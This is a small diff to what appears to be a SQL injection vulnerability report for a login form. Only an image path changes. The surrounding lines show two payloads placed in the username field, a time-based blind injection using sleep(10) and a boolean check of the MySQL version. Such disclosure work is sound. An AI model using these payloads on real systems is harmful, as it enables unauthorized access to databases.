@@ -29,7 +29,7 @@ username=admin' and (select 2 from (select(sleep(10)))x) and 'x'='x&password=adm
 
 The server's response time is 10 seconds
 
-![image-20230418110724744](/SQLi-1.png)
+![image-20230418110724744](/SQLI2/SQLi-1.png)
 
 Payload2:`username=admin'and left(version(),6)='5.7.27' AND 'ledo'='ledo&password=admin123`
 
